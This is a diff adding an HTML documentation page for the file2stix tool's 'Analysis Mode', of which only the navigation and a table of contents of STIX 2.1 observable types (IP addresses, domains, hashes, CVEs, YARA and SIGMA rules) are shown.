@@ -1,0 +1,2901 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.6">
+    
+    
+      
+        <title>3.2. Analysis Mode (default) - file2stix Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.20d9efc8.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#extractions-analysis-mode" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="file2stix Docs" class="md-header__button md-logo" aria-label="file2stix Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            file2stix Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              3.2. Analysis Mode (default)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/signalscorps/file2stix" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    signalscorps/file2stix
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="file2stix Docs" class="md-nav__button md-logo" aria-label="file2stix Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    file2stix Docs
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/signalscorps/file2stix" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    signalscorps/file2stix
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        1. Index
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../inputs/" class="md-nav__link">
+        2. Inputs
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          3. Extraction Modes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="3. Extraction Modes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          3. Extraction Modes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../extractions/" class="md-nav__link">
+        3.1. Overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          3.2. Analysis Mode (default)
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        3.2. Analysis Mode (default)
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sco-creation-logic" class="md-nav__link">
+    SCO creation logic
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-ipv4-address-observables-without-port-indicator" class="md-nav__link">
+    1.1 IPv4 Address Observables without port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="1.1 IPv4 Address Observables without port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv4-addr-sco" class="md-nav__link">
+    STIX 2.1 ipv4-addr SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-ipv4-address-observables-with-port-indicator" class="md-nav__link">
+    1.2 IPv4 Address Observables with port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2 IPv4 Address Observables with port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_1" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv4-addr-and-network-traffic-sco" class="md-nav__link">
+    STIX 2.1 ipv4-addr and network-traffic SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-ipv6-observables-without-port-indicator" class="md-nav__link">
+    2.1 IPv6 Observables without port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1 IPv6 Observables without port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_2" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv6-addr-sco" class="md-nav__link">
+    STIX 2.1 ipv6-addr SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-ipv6-observables-with-port-indicator" class="md-nav__link">
+    2.2 IPv6 Observables with port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2 IPv6 Observables with port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_3" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv6-addr-and-network-traffic-sco" class="md-nav__link">
+    STIX 2.1 ipv6-addr and network-traffic SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-domain-name-observables-indicator" class="md-nav__link">
+    3. Domain Name Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Domain Name Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_4" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-domain-name-sco" class="md-nav__link">
+    STIX 2.1 domain-name SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-url-observables-indicator" class="md-nav__link">
+    4. URL Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="4. URL Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_5" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-url-sco" class="md-nav__link">
+    STIX 2.1 url SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-file-name-observables-indicator" class="md-nav__link">
+    5. File Name Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="5. File Name Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_6" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-file-sco" class="md-nav__link">
+    STIX 2.1 file SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-directory-path-observables-indicator" class="md-nav__link">
+    6. Directory Path Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Directory Path Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_7" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-directory-sco" class="md-nav__link">
+    STIX 2.1 directory SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-file-hashes-indicator" class="md-nav__link">
+    7. File Hashes (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="7. File Hashes (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_8" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-file-sco_1" class="md-nav__link">
+    STIX 2.1 file SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-email-address-observables-indicator" class="md-nav__link">
+    8. Email Address Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Email Address Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_9" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-file-sco_2" class="md-nav__link">
+    STIX 2.1 file SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-mac-address-observables-indicator" class="md-nav__link">
+    9. MAC Address Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="9. MAC Address Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_10" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-mac-addr-sco" class="md-nav__link">
+    STIX 2.1 mac-addr SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-windows-registry-key-observables-indicator" class="md-nav__link">
+    10. Windows Registry Key Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="10. Windows Registry Key Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_11" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-windows-registry-key-sco" class="md-nav__link">
+    STIX 2.1 windows-registry-key SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-user-agent-observables-indicator" class="md-nav__link">
+    11. User Agent Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="11. User Agent Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-user-agent-sco" class="md-nav__link">
+    STIX 2.1 user-agent SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_12" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-autonomous-system-number-observables-indicator" class="md-nav__link">
+    12. Autonomous System Number Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="12. Autonomous System Number Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_13" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-autonomous-system-sco" class="md-nav__link">
+    STIX 2.1 autonomous-system SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13-cryptocurrency-observables-indicator" class="md-nav__link">
+    13. Cryptocurrency Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="13. Cryptocurrency Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_1" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-cryptocurrency-transaaction-sco" class="md-nav__link">
+    STIX 2.1 cryptocurrency transaaction SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_14" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14-cve-observables-vulnerability" class="md-nav__link">
+    14. CVE Observables (vulnerability)
+  </a>
+  
+    <nav class="md-nav" aria-label="14. CVE Observables (vulnerability)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-vulnerability-extension-definition" class="md-nav__link">
+    STIX 2.1 vulnerability extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-vulnerability-sdo" class="md-nav__link">
+    STIX 2.1 vulnerability SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indictor-extension-definition" class="md-nav__link">
+    STIX 2.1 indictor extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_15" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15-country-observables-location" class="md-nav__link">
+    15. Country Observables (location)
+  </a>
+  
+    <nav class="md-nav" aria-label="15. Country Observables (location)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-location-sdo" class="md-nav__link">
+    STIX 2.1 location SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16-credit-card-observables-indicator" class="md-nav__link">
+    16. Credit Card Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="16. Credit Card Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_2" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-credit-card-sco" class="md-nav__link">
+    STIX 2.1 credit-card SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_16" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17-bank-account-observables-indicator" class="md-nav__link">
+    17. Bank Account Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="17. Bank Account Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_3" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-bank-account-sco" class="md-nav__link">
+    STIX 2.1 bank-account SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_17" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18-yara-rule-observables-indicator" class="md-nav__link">
+    18. YARA Rule Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="18. YARA Rule Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_18" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19-sigma-rule-observables-indicator" class="md-nav__link">
+    19. SIGMA Rule Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="19. SIGMA Rule Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_4" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_19" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20-cpe-observables-software" class="md-nav__link">
+    20. CPE Observables (software)
+  </a>
+  
+    <nav class="md-nav" aria-label="20. CPE Observables (software)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_20" class="md-nav__link">
+    STIX 2.1 Indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-software-sco" class="md-nav__link">
+    STIX 2.1 software SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-mitre-attck-observables" class="md-nav__link">
+    21. MITRE ATT&amp;CK Observables
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-mitre-capec-observables" class="md-nav__link">
+    22. MITRE CAPEC Observables
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-lookups" class="md-nav__link">
+    23. Lookups
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-custom-extractions" class="md-nav__link">
+    24. Custom Extractions
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../extractions-observed-mode/" class="md-nav__link">
+        3.3. Observed Mode
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../extractions-sightings-mode/" class="md-nav__link">
+        3.4. Sightings Mode
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../backends/" class="md-nav__link">
+        4. Backends
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../developers/" class="md-nav__link">
+        5. Developers / Testing
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../demo/" class="md-nav__link">
+        6. Demo Walkthrough
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sco-creation-logic" class="md-nav__link">
+    SCO creation logic
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-ipv4-address-observables-without-port-indicator" class="md-nav__link">
+    1.1 IPv4 Address Observables without port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="1.1 IPv4 Address Observables without port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv4-addr-sco" class="md-nav__link">
+    STIX 2.1 ipv4-addr SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-ipv4-address-observables-with-port-indicator" class="md-nav__link">
+    1.2 IPv4 Address Observables with port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2 IPv4 Address Observables with port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_1" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv4-addr-and-network-traffic-sco" class="md-nav__link">
+    STIX 2.1 ipv4-addr and network-traffic SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-ipv6-observables-without-port-indicator" class="md-nav__link">
+    2.1 IPv6 Observables without port (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1 IPv6 Observables without port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_2" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv6-addr-sco" class="md-nav__link">
+    STIX 2.1 ipv6-addr SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-ipv6-observables-with-port-indicator" class="md-nav__link">
+    2.2 IPv6 Observables with port (indicator)
+  </a>
+  
